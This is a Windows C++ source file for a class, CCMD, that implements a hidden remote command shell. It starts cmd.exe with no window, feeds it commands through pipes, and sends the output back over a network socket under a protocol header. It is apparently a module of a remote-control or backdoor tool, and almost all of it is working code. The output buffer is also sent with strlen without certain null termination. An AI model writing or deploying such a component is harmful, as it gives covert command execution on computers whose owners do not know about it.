#include "CMD.h"
#include "protocol.h"
#include <stdio.h>

CCMD::CCMD(int s)
{
    m_cs = s;

    //构建管道
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    BOOL bRet = CreatePipe(
        &m_hReadOrder,  //读出端句柄
        &m_hWriteOrder, //写入端句柄
        &sa,
        0); //使用默认的缓冲区大小

    bRet = CreatePipe(
        &m_hReadResult,  //读出端句柄
        &m_hWriteResult, //写入端句柄
        &sa,
        0); //使用默认的缓冲区大小

    //打开进程CMD
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES;
    si.hStdInput = m_hReadOrder;
    si.hStdOutput = m_hWriteResult;
    ZeroMemory(&pi, sizeof(pi));

    //创建CMD进程
    TCHAR szName[] = { TEXT("cmd") };
    if (!CreateProcess(NULL, // No module name (use command line).
        szName, // Command line.
        NULL,             // Process handle not inheritable.
        NULL,             // Thread handle not inheritable.
        TRUE,            // Set handle inheritance to FALSE.
        CREATE_NO_WINDOW,                // No creation flags.
        NULL,             // Use parent's environment block.
        NULL,             // Use parent's starting directory.
        &si,              // Pointer to STARTUPINFO structure.
        &pi)             // Pointer to PROCESS_INFORMATION structure.
        )
    {
        MessageBox(NULL, TEXT("create CMD fail!"), NULL, MB_OK);
    }

}


CCMD::~CCMD()
{
}

DWORD WINAPI  ProcExecute(LPVOID lpParameter)//读取结果的线程
{
    CCMD* pThis = (CCMD*)lpParameter;

    //发送头
    HEADER head;
    head.nCmd = CMD_RESULT;
    send(pThis->m_cs, (char*)&head, sizeof(head), 0);
//    MessageBox(NULL, TEXT("send head "), NULL, MB_OK);
    DWORD dwToRead = 0;
    DWORD dwUsable = 0;  //管道中可用字节数
    clock_t tBegin = clock();
    while (true)
    {
        clock_t tEnd = clock();
        if (tEnd - tBegin > 10000)//10秒退出线程
        {
            return 0;
        }

        PeekNamedPipe(pThis->m_hReadResult, NULL, NULL, NULL, &dwUsable, NULL);

        //拿到本次的结果
        char szTemp[0x1000] = { 0 };

        //如果管道中还有数据,则读取
        if (dwUsable > 0)
        {
            BOOL bRet = ReadFile(
                pThis->m_hReadResult,
                szTemp,
                sizeof(szTemp),
                &dwToRead,
                NULL);
            if (!bRet)
            {
                MessageBox(NULL, TEXT("read result fail!"), NULL, MB_OK);
            }

            send(pThis->m_cs, szTemp, strlen(szTemp), 0);
        }
    }
    return 0;
}

void CCMD::execute(char* pOrder)//执行指令
{
    DWORD dwToWrite = 0;
    BOOL bRet = WriteFile(
        m_hWriteOrder,
        pOrder,
        strlen(pOrder),
        &dwToWrite,
        NULL);
    if (!bRet)
    {
        MessageBox(NULL, TEXT("write order fail!"), NULL, MB_OK);
    }
    
    //创建线程用于读取CMD的信息
    DWORD dwThreadId = 0;
    HANDLE hThread = CreateThread(
        NULL,
        0, //使用默认栈大小,一般是1M,在链接选项(堆栈保留大小)可以修改
        (LPTHREAD_START_ROUTINE)ProcExecute,
        (LPVOID)this,
        0, //立即运行
        &dwThreadId);
    if (hThread == NULL)
    {
        MessageBox(NULL, TEXT("create thread fail!"), NULL, MB_OK);
    }


}
